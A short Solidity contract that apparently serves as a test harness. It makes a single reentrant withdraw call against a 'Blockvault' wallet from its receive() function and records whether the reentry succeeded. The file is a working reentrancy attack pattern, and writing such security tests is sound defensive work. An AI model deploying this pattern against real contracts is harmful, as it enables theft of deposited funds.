
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface IBlockvaultWallet {
    function createWallet() external;

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract ReentrantReceiver {
    IBlockvaultWallet public wallet;

    uint256 public reentryAmount;

    bool public attackInProgress;
    bool public reentryAttempted;
    bool public reentrySucceeded;

    constructor(address walletAddress) {
        wallet = IBlockvaultWallet(walletAddress);
    }

    // Create this contract's wallet and deposit ETH.
    function createWalletAndDeposit() external payable {
        wallet.createWallet();

        wallet.deposit{value: msg.value}();
    }

    // Start the withdrawal and trigger the reentry attempt.
    function startAttack(uint256 amount) external {
        require(!attackInProgress, "Attack already running");

        reentryAmount = amount;
        attackInProgress = true;
        reentryAttempted = false;
        reentrySucceeded = false;

        wallet.withdraw(amount);

        attackInProgress = false;
    }

    // Called when this contract receives ETH.
    receive() external payable {
        if (attackInProgress && !reentryAttempted) {
            reentryAttempted = true;

            // Attempt to withdraw again during the first withdrawal.
            (bool success, ) = address(wallet).call(
                abi.encodeWithSelector(
                    IBlockvaultWallet.withdraw.selector,
                    reentryAmount
                )
            );

            reentrySucceeded = success;
        }
    }
}
